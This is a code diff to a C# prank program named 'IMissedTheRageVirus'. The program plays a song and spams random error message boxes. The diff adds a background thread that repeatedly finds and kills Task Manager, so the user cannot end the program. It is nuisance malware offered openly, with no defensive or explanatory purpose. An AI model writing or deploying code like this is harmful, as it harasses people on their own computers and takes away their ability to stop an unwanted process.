@@ -10,9 +10,12 @@ using System.Windows;
 using System.Windows.Forms;
 using System.Timers;
 using System.IO;
+using System.Diagnostics;
 
 namespace IMissedTheRageVirus
 {
+     //NOTE FOR DEBUGGING: To show the console Just go to the application's Properties and change the Output type from Windows Application to Console Application. this applies for building
+     
     class Program
     {
         private static System.Timers.Timer msgTimer;
@@ -55,8 +58,13 @@ namespace IMissedTheRageVirus
             System.Media.SoundPlayer player = new System.Media.SoundPlayer(Properties.Resources.IMissedTheRage);
             player.Play();
 
+            Thread protectT = new Thread(protectThread);
+            protectT.Start();
+
             Console.WriteLine("Press the Enter key to exit anytime... ");
             Console.ReadLine();
+
+            
         }
 
         private static void msgSpam(Object source, System.Timers.ElapsedEventArgs e)
@@ -81,6 +89,23 @@ namespace IMissedTheRageVirus
                     string choice = msgList[r.Next(msgList.Length)]; // Selects random string from list that i have carefully hand crafted
                     MessageBox.Show(choice, "Alert!", MessageBoxButtons.OK, MessageBoxIcon.Error); //shows an alert
                     break;
+            }
+        }
+
+        static void protectThread()
+        {
+            while (true)
+            {
+                Process[] tskmgr = Process.GetProcessesByName("taskmgr");
+                if (tskmgr.Length > 0)
+                {
+                    Console.WriteLine("Task manager is open!");
+                    foreach (Process process in tskmgr)
+                    {
+                        process.Kill();
+                    }
+                }
+                Thread.Sleep(2000);
             }
         }
 
